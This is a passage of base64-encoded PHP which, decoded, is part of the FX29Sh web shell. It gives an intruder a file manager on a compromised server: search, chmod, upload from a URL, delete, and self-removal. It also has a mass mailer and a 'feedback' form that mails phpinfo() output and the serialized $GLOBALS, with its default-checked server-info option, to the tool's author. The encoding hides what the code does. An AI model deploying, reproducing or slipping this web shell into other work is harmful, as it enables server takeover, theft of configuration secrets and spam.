gJGFycl9jdXQgPSAkc2Vzc19kYXRhWyJjdXQiXTsKICAkYXJyID0gYXJyYXlfbWVyZ2UoJGFycl9jb3B5LCRhcnJfY3V0KTsKICBpZiAoY291bnQoJGFycikgPT0gMCkge2VjaG8gIjxoMj48Y2VudGVyPkJ1ZmZlciBpcyBlbXB0eSE8L2NlbnRlcj48L2gyPiI7fQogIGVsc2UgewogICAgJGZ4X2luZm9oZWFkID0gIkZpbGUtU3lzdGVtIEJ1ZmZlciI7CiAgICAkbHNfYXJyID0gJGFycjsKICAgICRkaXNwX2Z1bGxwYXRoID0gVFJVRTsKICAgICRhY3QgPSAibHMiOwogIH0KfQppZiAoJGFjdCA9PSAic2VsZnJlbW92ZSIpIHsKICBpZiAoKCRzdWJtaXQgPT0gJHJuZGNvZGUpIGFuZCAoJHN1Ym1pdCAhPSAiIikpIHsKICAgIGlmICh1bmxpbmsoX19GSUxFX18pKSB7IEBvYl9jbGVhbigpOyBlY2hvICJUaGFua3MgZm9yIHVzaW5nICIuJHNoX25hbWUuIiEiOyBmeDI5c2hleGl0KCk7IH0KICAgIGVsc2UgeyBlY2hvICI8Y2VudGVyPjxiPkNhbid0IGRlbGV0ZSAiLl9fRklMRV9fLiIhPC9iPjwvY2VudGVyPiI7IH0KICB9CiAgZWxzZSB7CiAgICBpZiAoIWVtcHR5KCRybmRjb2RlKSkge2VjaG8gIjxiPkVycm9yOiBpbmNvcnJlY3QgY29uZmlybWF0aW9uITwvYj4iO30KICAgICRybmQgPSByYW5kKDAsOSkucmFuZCgwLDkpLnJhbmQoMCw5KTsKICAgIGVjaG8gIjxmb3JtIGFjdGlvbj1cIiIuJHN1cmwuIlwiPlxuIi4KICAgICAgICAgIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdCB2YWx1ZT1zZWxmcmVtb3ZlPiIuCiAgICAgICAgICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1ybmRjb2RlIHZhbHVlPVwiIi4kcm5kLiJcIj4iLgogICAgICAgICAiPGI+S2lsbC1zaGVsbDogIi5fX0ZJTEVfXy4iIDxicj4iLgogICAgICAgICAiPGI+QXJlIHlvdSBzdXJlPyBGb3IgY29uZmlybWF0aW9uLCBlbnRlciBcIiIuJHJuZC4iXCI8L2I+OiZuYnNwOzxpbnB1dCB0eXBlPXRleHQgbmFtZT1zdWJtaXQ+Jm5ic3A7PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPVwiWUVTXCI+XG4iLgogICAgICAgICAiPC9mb3JtPlxuIjsKICB9Cn0KaWYgKCRhY3QgPT0gInVwZGF0ZSIpIHsKICAkcmV0ID0gZngyOXNoX2dldHVwZGF0ZSghISRjb25maXJtdXBkYXRlKTsKICBlY2hvICI8Yj4iLiRyZXQuIjwvYj4iOwogIGlmIChzdHJpc3RyKCRyZXQsIm5ldyB2ZXJzaW9uIikpIHsKICAgIGVjaG8gIjxicj48YnI+PGlucHV0IHR5cGU9YnV0dG9uIG9uY2xpY2s9XCJsb2NhdGlvbi5ocmVmPSciLiRzdXJsLiJhY3Q9dXBkYXRlJmNvbmZpcm11cGRhdGU9MSc7XCIgdmFsdWU9XCJVcGRhdGUgbm93XCI+IjsKICB9Cn0KaWYgKCRhY3QgPT0gImZlZWRiYWNrIikgewogICRzdXBwbWFpbCA9IGJhc2U2NF9kZWNvZGUoIlJlbW92ZWQiKTsKICBpZiAoIWVtcHR5KCRzdWJtaXQpKXsKICAgICR0aWNrZXQgPSBzdWJzdHIobWQ1KG1pY3JvdGltZSgpK3JhbmQoMSwxMDAwKSksMCw2KTsKICAgICRib2R5ID0gJHNoX25hbWUuIiBmZWVkYmFjayAjIi4kdGlja2V0LiJcbk5hbWU6ICIuaHRtbHNwZWNpYWxjaGFycygkZmRia19uYW1lKS4iXG5FLW1haWw6ICIuaHRtbHNwZWNpYWxjaGFycygkZmRia19lbWFpbCkuIlxuTWVzc2FnZTpcbiIuaHRtbHNwZWNpYWxjaGFycygkZmRia19ib2R5KS4iXG5cbklQOiAiLiRSRU1PVEVfQUREUjsKICAgIGlmICghZW1wdHkoJGZkYmtfcmVmKSkgewogICAgICAkdG1wID0gQG9iX2dldF9jb250ZW50cygpOwogICAgICBvYl9jbGVhbigpOwogICAgICBwaHBpbmZvKCk7CiAgICAgICRwaHBpbmZvID0gYmFzZTY0X2VuY29kZShvYl9nZXRfY29udGVudHMoKSk7CiAgICAgIG9iX2NsZWFuKCk7CiAgICAgIGVjaG8gJHRtcDsKICAgICAgJGJvZHkgLj0gIlxuIi4icGhwaW5mbygpOiAiLiRwaHBpbmZvLiJcbiIuIlwkR0xPQkFMUz0iLmJhc2U2NF9lbmNvZGUoc2VyaWFsaXplKCRHTE9CQUxTKSkuIlxuIjsKICAgIH0KICAgIG1haWwoJHN1cHBtYWlsLCRzaF9uYW1lLiIgZmVlZGJhY2sgIyIuJHRpY2tldCwkYm9keSwiRlJPTTogIi4kc3VwcG1haWwpOwogICAgZWNobyAiPGNlbnRlcj48Yj5UaGFua3MgZm9yIHlvdXIgZmVlZGJhY2shIFlvdXIgdGlja2V0IElEOiAiLiR0aWNrZXQuIi48L2I+PC9jZW50ZXI+IjsKICB9CiAgZWxzZSB7CiAgICBlY2hvICI8Zm9ybSBhY3Rpb249XCIiLiRzdXJsLiJcIiBtZXRob2Q9UE9TVD4iLgogICAgICAgICAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0IHZhbHVlPWZlZWRiYWNrPiIuCiAgICAgICAgICI8dGFibGUgY2xhc3M9Y29udGVudHM+PHRyPjx0ZCBjbGFzcz1iYXJoZWFkZXIgY29sc3Bhbj0yPiIuCiAgICAgICAgICIuOiBGZWVkYmFjayBvciByZXBvcnQgYnVnICgiLnN0cl9yZXBsYWNlKGFycmF5KCJAIiwiLiIpLGFycmF5KCJbYXRdIiwiW2RvdF0iKSwkc3VwcG1haWwpLiIpIDouPC90ZD48L3RyPiIuCiAgICAgICAgICI8dHI+PHRkPllvdXIgbmFtZTo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwiZmRia19uYW1lXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJGZkYmtfbmFtZSkuIlwiPjwvdGQ8L3RyPiIuCiAgICAgICAgICI8dHI+PHRkPllvdXIgZS1tYWlsOjwvdGQ+PHRkPjxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJmZGJrX2VtYWlsXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJGZkYmtfZW1haWwpLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+TWVzc2FnZTo8L3RkPjx0ZD48dGV4dGFyZWEgbmFtZT1cImZkYmtfYm9keVwiIGNvbHM9ODAgcm93cz0xMD4iLmh0bWxzcGVjaWFsY2hhcnMoJGZkYmtfYm9keSkuIjwvdGV4dGFyZWE+PGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwiZmRia19yZWZcIiB2YWx1ZT1cIiIudXJsZW5jb2RlKCRIVFRQX1JFRkVSRVIpLiJcIj48YnI+Ii4KICAgICAgICAgIjxpbnB1dCB0eXBlPVwiY2hlY2tib3hcIiBuYW1lPVwiZmRia19zZXJ2aW5mXCIgdmFsdWU9XCIxXCIgY2hlY2tlZD4gQXR0YWNoIFNlcnZlciBpbmZvIChSZWNvbW1lbmRlZCBmb3IgYnVnLWZpeCk8YnI+Ii4KICAgICAgICAgIipMYW5ndWFnZTogRW5nbGlzaCwgSW5kb25lc2lhbi48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJzdWJtaXRcIiBuYW1lPVwic3VibWl0XCIgdmFsdWU9XCJTZW5kXCI+PC9mb3JtPjwvdGQ+PC90cj4iLgogICAgICAgICAiPC90YWJsZT5cbiI7CiAgfQp9CmlmICgkYWN0ID09ICJmeG1haWxlciIpIHsKICBpZiAoIWVtcHR5KCRzdWJtaXQpKXsKICAgICRoZWFkZXJzID0gJ1RvOiAnLiRkZXN0X2VtYWlsLiJcclxuIjsKICAgICRoZWFkZXJzIC49ICdGcm9tOiAnLiRzZW5kZXJfbmFtZS4nICcuJHNlbmRlcl9lbWFpbC4iXHJcbiI7CiAgICBpZiAobWFpbCgkc3VwcG1haWwsJHNlbmRlcl9zdWJqLCRzZW5kZXJfYm9keSwkaGVhZGVyKSkgewogICAgICBlY2hvICI8Y2VudGVyPjxiPkVtYWlsIHNlbnQhPC9iPjwvY2VudGVyPiI7CiAgICB9CiAgICBlbHNlIHsgZWNobyAiPGNlbnRlcj48Yj5DYW4ndCBzZW5kIGVtYWlsITwvYj48L2NlbnRlcj4iOyB9CiAgfQogIGVsc2UgewogICAgZWNobyAiPGZvcm0gYWN0aW9uPVwiIi4kc3VybC4iXCIgbWV0aG9kPVBPU1Q+Ii4KICAgICAgICAgIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdCB2YWx1ZT1meG1haWxlcj4iLgogICAgICAgICAiPHRhYmxlIGNsYXNzPWNvbnRlbnRzPjx0cj48dGQgY2xhc3M9YmFyaGVhZGVyIGNvbHNwYW49Mj4iLgogICAgICAgICAiLjogJHNoX25hbWUgTWFpbGVyIDouPC90ZD48L3RyPiIuCiAgICAgICAgICI8dHI+PHRkPllvdXIgbmFtZTo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwic2VuZGVyX25hbWVcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc2VuZGVyX25hbWUpLiJcIj48L3RkPC90cj4iLgogICAgICAgICAiPHRyPjx0ZD5Zb3VyIGUtbWFpbDo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwic2VuZGVyX2VtYWlsXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNlbmRlcl9lbWFpbCkuIlwiPjwvdGQ+PC90cj4iLgogICAgICAgICAiPHRyPjx0ZD5Ubzo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwiZGVzdF9lbWFpbFwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRkZXN0X2VtYWlsKS4iXCI+PC90ZD48L3RyPiIuCiAgICAgICAgICI8dHI+PHRkPlN1YmplY3Q6PC90ZD48dGQ+PGlucHV0IHNpemU9NzAgdHlwZT1cInRleHRcIiBuYW1lPVwic2VuZGVyX3N1YmpcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc2VuZGVyX3N1YmopLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+TWVzc2FnZTo8L3RkPjx0ZD48dGV4dGFyZWEgbmFtZT1cInNlbmRlcl9ib2R5XCIgY29scz04MCByb3dzPTEwPiIuaHRtbHNwZWNpYWxjaGFycygkc2VuZGVyX2JvZHkpLiI8L3RleHRhcmVhPjxicj4iLgogICAgICAgICAiPHRyPjx0ZD48L3RkPjx0ZD48aW5wdXQgdHlwZT1cInN1Ym1pdFwiIG5hbWU9XCJzdWJtaXRcIiB2YWx1ZT1cIlNlbmRcIj48L2Zvcm0+PC90ZD48L3RyPiIuCiAgICAgICAgICI8L3RhYmxlPlxuIjsKICB9Cn0KaWYgKCRhY3QgPT0gInNlYXJjaCIpIHsKICBlY2hvICI8ZGl2IGNsYXNzPWJhcmhlYWRlcj4uOiAkc2hfbmFtZSBGaWxlLVN5c3RlbSBTZWFyY2ggOi48L2Rpdj4iOwogIGlmIChlbXB0eSgkc2VhcmNoX2luKSkgeyRzZWFyY2hfaW4gPSAkZDt9CiAgaWYgKGVtcHR5KCRzZWFyY2hfbmFtZSkpIHskc2VhcmNoX25hbWUgPSAiKC4qKSI7ICRzZWFyY2hfbmFtZV9yZWdleHAgPSAxO30KICBpZiAoZW1wdHkoJHNlYXJjaF90ZXh0X3d3bykpIHskc2VhcmNoX3RleHRfcmVnZXhwID0gMDt9CiAgaWYgKCFlbXB0eSgkc3VibWl0KSkgewogICAgJGZvdW5kID0gYXJyYXkoKTsKICAgICRmb3VuZF9kID0gMDsKICAgICRmb3VuZF9mID0gMDsKICAgICRzZWFyY2hfaV9mID0gMDsKICAgICRzZWFyY2hfaV9kID0gMDsKICAgICRhID0gYXJyYXkoCiAgICAgICAgIm5hbWUiPT4kc2VhcmNoX25hbWUsCiAgICAgICAgIm5hbWVfcmVnZXhwIj0+JHNlYXJjaF9uYW1lX3JlZ2V4cCwKICAgICAgICAidGV4dCI9PiRzZWFyY2hfdGV4dCwKICAgICAgICAidGV4dF9yZWdleHAiPT4kc2VhcmNoX3RleHRfcmVneHAsCiAgICAgICAgInRleHRfd3dvIj0+JHNlYXJjaF90ZXh0X3d3bywKICAgICAgICAidGV4dF9jcyI9PiRzZWFyY2hfdGV4dF9jcywKICAgICAgICAidGV4dF9ub3QiPT4kc2VhcmNoX3RleHRfbm90CiAgICApOwogICAgJHNlYXJjaHRpbWUgPSBnZXRtaWNyb3RpbWUoKTsKICAgICRpbiA9IGFycmF5X3VuaXF1ZShleHBsb2RlKCI7Iiwkc2VhcmNoX2luKSk7CiAgICBmb3JlYWNoKCRpbiBhcyAkdikge2Z4Mjlmc2VhcmNoKCR2KTt9CiAgICAkc2VhcmNodGltZSA9IHJvdW5kKGdldG1pY3JvdGltZSgpLSRzZWFyY2h0aW1lLDQpOwogICAgaWYgKGNvdW50KCRmb3VuZCkgPT0gMCkge2VjaG8gIk5vIGZpbGVzIGZvdW5kISI7fQogICAgZWxzZSB7CiAgICAgICRsc19hcnIgPSAkZm91bmQ7CiAgICAgICRkaXNwX2Z1bGxwYXRoID0gVFJVRTsKICAgICAgJGFjdCA9ICJscyI7CiAgICB9CiAgfQogIGVjaG8gIjx0YWJsZSBjbGFzcz1jb250ZW50cz4iLgogICAgICAgIjx0cj48dGQ+PGZvcm0gbWV0aG9kPVBPU1Q+Ii4KICAgICAgICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1cImRcIiB2YWx1ZT1cIiIuJGRpc3BkLiJcIj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3QgdmFsdWU9XCIiLiRkc3BhY3QuIlwiPiIuCiAgICAgICAiRmlsZSBvciBmb2xkZXIgTmFtZTo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwic2VhcmNoX25hbWVcIiBzaXplPVwiIi5yb3VuZChzdHJsZW4oJHNlYXJjaF9uYW1lKSsyNSkuIlwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzZWFyY2hfbmFtZSkuIlwiPiZuYnNwOzxpbnB1dCB0eXBlPVwiY2hlY2tib3hcIiBuYW1lPVwic2VhcmNoX25hbWVfcmVnZXhwXCIgdmFsdWU9XCIxXCIgIi4oJHNlYXJjaF9uYW1lX3JlZ2V4cCA9PSAxPyIgY2hlY2tlZCI6IiIpLiI+IC0gUmVndWxhciBFeHByZXNzaW9uPC90ZD48L3RyPiIuCiAgICAgICAiPHRyPjx0ZD5Mb29rIGluIChTZXBhcmF0ZSBieSBcIjtcIik6PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJ0ZXh0XCIgbmFtZT1cInNlYXJjaF9pblwiIHNpemU9XCIiLnJvdW5kKHN0cmxlbigkc2VhcmNoX2luKSsyNSkuIlwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCRzZWFyY2hfaW4pLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICI8dHI+PHRkPkEgd29yZCBvciBwaHJhc2UgaW4gdGhlIGZpbGU6PC90ZD48dGQ+PHRleHRhcmVhIG5hbWU9XCJzZWFyY2hfdGV4dFwiIGNvbHM9XCI1MFwiIHJvd3M9XCI1XCI+Ii5odG1sc3BlY2lhbGNoYXJzKCRzZWFyY2hfdGV4dCkuIjwvdGV4dGFyZWE+PC90ZD48L3RyPiIuCiAgICAgICAiPHRyPjx0ZD48L3RkPjx0ZD48aW5wdXQgdHlwZT1cImNoZWNrYm94XCIgbmFtZT1cInNlYXJjaF90ZXh0X3JlZ2V4cFwiIHZhbHVlPVwiMVwiICIuKCRzZWFyY2hfdGV4dF9yZWdleHAgPT0gMT8iIGNoZWNrZWQiOiIiKS4iPiBSZWd1bGFyIEV4cHJlc3Npb24iLgogICAgICAgIiAgPGlucHV0IHR5cGU9XCJjaGVja2JveFwiIG5hbWU9XCJzZWFyY2hfdGV4dF93d29cIiB2YWx1ZT1cIjFcIiAiLigkc2VhcmNoX3RleHRfd3dvID09IDE/IiBjaGVja2VkIjoiIikuIj4gV2hvbGUgd29yZHMgb25seSIuCiAgICAgICAiICA8aW5wdXQgdHlwZT1cImNoZWNrYm94XCIgbmFtZT1cInNlYXJjaF90ZXh0X2NzXCIgdmFsdWU9XCIxXCIgIi4oJHNlYXJjaF90ZXh0X2NzID09IDE/IiBjaGVja2VkIjoiIikuIj4gQ2FzZSBzZW5zaXRpdmUiLgogICAgICAgIiAgPGlucHV0IHR5cGU9XCJjaGVja2JveFwiIG5hbWU9XCJzZWFyY2hfdGV4dF9ub3RcIiB2YWx1ZT1cIjFcIiAiLigkc2VhcmNoX3RleHRfbm90ID09IDE/IiBjaGVja2VkIjoiIikuIj4gRmluZCBmaWxlcyBOT1QgY29udGFpbmluZyB0aGUgdGV4dDwvdGQ+PC90cj4iLgogICAgICAgIjx0cj48dGQ+PC90ZD48dGQ+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9c3VibWl0IHZhbHVlPVwiU2VhcmNoXCI+PC9mb3JtPjwvdGQ+PC90cj4iLgogICAgICAgIjwvdGFibGU+XG4iOwogIGlmICgkYWN0ID09ICJscyIpIHsKICAgICRkc3BhY3QgPSAkYWN0OwogICAgZWNobyAkc2VhcmNodGltZS4iIHNlY3MgKCIuJHNlYXJjaF9pX2YuIiBmaWxlcyBhbmQgIi4kc2VhcmNoX2lfZC4iIGZvbGRlcnMsICIucm91bmQoKCRzZWFyY2hfaV9mKyRzZWFyY2hfaV9kKS8kc2VhcmNodGltZSw0KS4iIG9iamVjdHMgcGVyIHNlY29uZCkuPC9iPiIuCiAgICAgICAgICI8aHIgc2l6ZT1cIjFcIiBub3NoYWRlPiI7CiAgfQp9CmlmICgkYWN0ID09ICJjaG1vZCIpIHsKICAkbW9kZSA9IGZpbGVwZXJtcygkZC4kZik7CiAgaWYgKCEkbW9kZSkge2VjaG8gIjxiPkNoYW5nZSBmaWxlLW1vZGUgd2l0aCBlcnJvcjo8L2I+IGNhbid0IGdldCBjdXJyZW50IHZhbHVlLiI7fQogIGVsc2UgewogICAgJGZvcm0gPSBUUlVFOwogICAgaWYgKCRjaG1vZF9zdWJtaXQpIHsKICAgICAgJG9jdGV0ID0gIjAiLmJhc2VfY29udmVydCgoJGNobW9kX29bInIiXT8xOjApLigkY2htb2Rfb1sidyJdPzE6MCkuKCRjaG1vZF9vWyJ4Il0/MTowKS4oJGNobW9kX2dbInIiXT8xOjApLigkY2htb2RfZ1sidyJdPzE6MCkuKCRjaG1vZF9nWyJ4Il0/MTowKS4oJGNobW9kX3dbInIiXT8xOjApLigkY2htb2Rfd1sidyJdPzE6MCkuKCRjaG1vZF93WyJ4Il0/MTowKSwyLDgpOwogICAgICBpZiAoY2htb2QoJGQuJGYsJG9jdGV0KSkgeyAkYWN0ID0gImxzIjsgJGZvcm0gPSBGQUxTRTsgJGVyciA9ICIiOyB9CiAgICAgIGVsc2UgeyRlcnIgPSAiQ2FuJ3QgY2htb2QgdG8gIi4kb2N0ZXQuIi4iO30KICAgIH0KICAgIGlmICgkZm9ybSkgewogICAgICAkcGVybXMgPSBwYXJzZV9wZXJtcygkbW9kZSk7CiAgICAgIGVjaG8gIjxiPkNoYW5naW5nIGZpbGUtbW9kZSAoIi4kZC4kZi4iKSwgIi52aWV3X3Blcm1zX2NvbG9yKCRkLiRmKS4iICgiLnN1YnN0cihkZWNvY3QoZmlsZXBlcm1zKCRkLiRmKSksLTQsNCkuIik8L2I+PGJyPiIuKCRlcnI/IjxiPkVycm9yOjwvYj4gIi4kZXJyOiIiKS4iPGZvcm0gYWN0aW9uPVwiIi4kc3VybC4iXCIgbWV0aG9kPVBPU1Q+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkZCkuIlwiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJGYpLiJcIj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3QgdmFsdWU9Y2htb2Q+PHRhYmxlIGFsaWduPWxlZnQgd2lkdGg9MzAwIGJvcmRlcj0wIGNlbGxzcGFjaW5nPTAgY2VsbHBhZGRpbmc9NT48dHI+PHRkPjxiPk93bmVyPC9iPjxicj48YnI+PGlucHV0IHR5cGU9Y2hlY2tib3ggTkFNRT1jaG1vZF9vW3JdIHZhbHVlPTEiLigkcGVybXNbIm8iXVsiciJdPyIgY2hlY2tlZCI6IiIpLiI+Jm5ic3A7UmVhZDxicj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPWNobW9kX29bd10gdmFsdWU9MSIuKCRwZXJtc1sibyJdWyJ3Il0/IiBjaGVja2VkIjoiIikuIj4mbmJzcDtXcml0ZTxicj48aW5wdXQgdHlwZT1jaGVja2JveCBOQU1FPWNobW9kX29beF0gdmFsdWU9MSIuKCRwZXJtc1sibyJdWyJ4Il0/IiBjaGVja2VkIjoiIikuIj5lWGVjdXRlPC90ZD48dGQ+PGI+R3JvdXA8L2I+PGJyPjxicj48aW5wdXQgdHlwZT1jaGVja2JveCBOQU1FPWNobW9kX2dbcl0gdmFsdWU9MSIuKCRwZXJtc1siZyJdWyJyIl0/IiBjaGVja2VkIjoiIikuIj4mbmJzcDtSZWFkPGJyPjxpbnB1dCB0eXBlPWNoZWNrYm94IE5BTUU9Y2htb2RfZ1t3XSB2YWx1ZT0xIi4oJHBlcm1zWyJnIl1bInciXT8iIGNoZWNrZWQiOiIiKS4iPiZuYnNwO1dyaXRlPGJyPjxpbnB1dCB0eXBlPWNoZWNrYm94IE5BTUU9Y2htb2RfZ1t4XSB2YWx1ZT0xIi4oJHBlcm1zWyJnIl1bIngiXT8iIGNoZWNrZWQiOiIiKS4iPmVYZWN1dGU8L2ZvbnQ+PC90ZD48dGQ+PGI+V29ybGQ8L2I+PGJyPjxicj48aW5wdXQgdHlwZT1jaGVja2JveCBOQU1FPWNobW9kX3dbcl0gdmFsdWU9MSIuKCRwZXJtc1sidyJdWyJyIl0/IiBjaGVja2VkIjoiIikuIj4mbmJzcDtSZWFkPGJyPjxpbnB1dCB0eXBlPWNoZWNrYm94IE5BTUU9Y2htb2Rfd1t3XSB2YWx1ZT0xIi4oJHBlcm1zWyJ3Il1bInciXT8iIGNoZWNrZWQiOiIiKS4iPiZuYnNwO1dyaXRlPGJyPjxpbnB1dCB0eXBlPWNoZWNrYm94IE5BTUU9Y2htb2Rfd1t4XSB2YWx1ZT0xIi4oJHBlcm1zWyJ3Il1bIngiXT8iIGNoZWNrZWQiOiIiKS4iPmVYZWN1dGU8L2ZvbnQ+PC90ZD48L3RyPjx0cj48dGQ+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9Y2htb2Rfc3VibWl0IHZhbHVlPVwiU2F2ZVwiPjwvdGQ+PC90cj48L3RhYmxlPjwvZm9ybT4iOwogICAgfQogIH0KfQppZiAoJGFjdCA9PSAidXBsb2FkIikgewogICR1cGxvYWRtZXNzID0gIiI7CiAgJHVwbG9hZHBhdGggPSBzdHJfcmVwbGFjZSgiXFwiLERJUkVDVE9SWV9TRVBBUkFUT1IsJHVwbG9hZHBhdGgpOwogIGlmIChlbXB0eSgkdXBsb2FkcGF0aCkpIHskdXBsb2FkcGF0aCA9ICRkO30KICBlbHNlaWYgKHN1YnN0cigkdXBsb2FkcGF0aCwtMSkgIT0gRElSRUNUT1JZX1NFUEFSQVRPUikgeyR1cGxvYWRwYXRoIC49IERJUkVDVE9SWV9TRVBBUkFUT1I7fQogIGlmICghZW1wdHkoJHN1Ym1pdCkpIHsKICAgIGdsb2JhbCAkX0ZJTEVTOwogICAgJHVwbG9hZGZpbGUgPSAkX0ZJTEVTWyJ1cGxvYWRmaWxlIl07CiAgICBpZiAoIWVtcHR5KCR1cGxvYWRmaWxlWyJ0bXBfbmFtZSJdKSkgewogICAgICBpZiAoZW1wdHkoJHVwbG9hZGZpbGVuYW1lKSkgeyRkZXN0aW4gPSAkdXBsb2FkZmlsZVsibmFtZSJdO30KICAgICAgZWxzZSB7JGRlc3RpbiA9ICR1c2VyZmlsZW5hbWU7fQogICAgICBpZiAoIW1vdmVfdXBsb2FkZWRfZmlsZSgkdXBsb2FkZmlsZVsidG1wX25hbWUiXSwkdXBsb2FkcGF0aC4kZGVzdGluKSkgewogICAgICAgICR1cGxvYWRtZXNzIC49ICJFcnJvciB1cGxvYWRpbmcgZmlsZSAiLiR1cGxvYWRmaWxlWyJuYW1lIl0uIiAoY2FuJ3QgY29weSBcIiIuJHVwbG9hZGZpbGVbInRtcF9uYW1lIl0uIlwiIHRvIFwiIi4kdXBsb2FkcGF0aC4kZGVzdGluLiJcIiE8YnI+IjsKICAgICAgfQogICAgICBlbHNlIHsgJHVwbG9hZG1lc3MgLj0gIkZpbGUgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5ITxicj4iLiR1cGxvYWRwYXRoLiRkZXN0aW47IH0KICAgIH0KICAgIGVsc2UgeyBlY2hvICJObyBmaWxlIHRvIHVwbG9hZCEiOyB9CiAgfQogIGlmICgkbWluaWZvcm0pIHsKICAgIGVjaG8gIjxiPiIuJHVwbG9hZG1lc3MuIjwvYj4iOwogICAgJGFjdCA9ICJscyI7CiAgfQogIGVsc2UgewogICAgZWNobyAiPHRhYmxlPjx0cj48dGQgY29sc3Bhbj0yIGNsYXNzPWJhcmhlYWRlcj4iLgogICAgICAgICAiLjogRmlsZSBVcGxvYWQgOi48L3RkPiIuCiAgICAgICAgICI8dGQgY29sc3Bhbj0yPiIuJHVwbG9hZG1lc3MuIjwvdGQ+PC90cj4iLgogICAgICAgICAiPHRyPjx0ZD48Zm9ybSBlbmN0eXBlPVwibXVsdGlwYXJ0L2Zvcm0tZGF0YVwiIGFjdGlvbj1cIiIuJHN1cmwuImFjdD11cGxvYWQmZD0iLnVybGVuY29kZSgkZCkuIlwiIG1ldGhvZD1QT1NUPiIuCiAgICAgICAgICJGcm9tIFlvdXIgQ29tcHV0ZXI6PC90ZD48dGQ+PGlucHV0IG5hbWU9XCJ1cGxvYWRmaWxlXCIgdHlwZT1cImZpbGVcIj48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+RnJvbSBVUkw6PC90ZD48dGQ+PGlucHV0IG5hbWU9XCJ1cGxvYWR1cmxcIiB0eXBlPVwidGV4dFwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKCR1cGxvYWR1cmwpLiJcIiBzaXplPVwiNzBcIj48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+VGFyZ2V0IERpcmVjdG9yeTo8L3RkPjx0ZD48aW5wdXQgbmFtZT1cInVwbG9hZHBhdGhcIiBzaXplPVwiNzBcIiB2YWx1ZT1cIiIuJGRpc3BkLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+VGFyZ2V0IEZpbGUgTmFtZTo8L3RkPjx0ZD48aW5wdXQgbmFtZT11cGxvYWRmaWxlbmFtZSBzaXplPTI1PjwvdGQ+PC90cj4iLgogICAgICAgICAiPHRyPjx0ZD48L3RkPjx0ZD48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPXVwbG9hZGF1dG9uYW1lIHZhbHVlPTEgaWQ9ZGY0PiBDb252ZXJ0IGZpbGUgbmFtZSB0byBsb3dlcmNhc2U8L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+PC90ZD48dGQ+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9c3VibWl0IHZhbHVlPVwiVXBsb2FkXCI+Ii4KICAgICAgICAgIjwvZm9ybT48L3RkPjwvdHI+PC90YWJsZT4iOwogIH0KfQppZiAoJGFjdCA9PSAiZGVsZXRlIikgewogICRkZWxlcnIgPSAiIjsKICBmb3JlYWNoICgkYWN0Ym94IGFzICR2KSB7CiAgICAkcmVzdWx0ID0gRkFMU0U7CiAgICAkcmVzdWx0ID0gZnNfcm1vYmooJHYpOwogICAgaWYgKCEkcmVzdWx0KSB7ICRkZWxlcnIgLj0gIkNhbid0IGRlbGV0ZSAiLmh0bWxzcGVjaWFsY2hhcnMoJHYpLiI8YnI+IjsgfQogIH0KICBpZiAoIWVtcHR5KCRkZWxlcnIpKSB7IGVjaG8gIjxiPkVycm9yIGRlbGV0aW5nOjwvYj48YnI+Ii4kZGVsZXJyOyB9CiAgJGFjdCA9ICJscyI7Cn0KaWYgKCEkdXNlZnNidWZmKSB7CiAgaWYgKCgkYWN0ID09ICJwYXN0ZSIpIG9yICgkYWN0ID09ICJjb3B5Iikgb3IgKCRhY3QgPT0gImN1dCIpIG9yICgkYWN0ID09ICJ1bnNlbGVjdCIpKSB7CiAgICBlY2hvICI8Y2VudGVyPjxiPlNvcnJ5LCBidWZmZXIgaXMgZGlzYWJsZWQuIEZvciBlbmFibGUsIHNldCBkaXJlY3RpdmUgXCJcJHVzZWZzYnVmZlwiIGFzIFRSVUUuPC9jZW50ZXI+IjsKICB9Cn0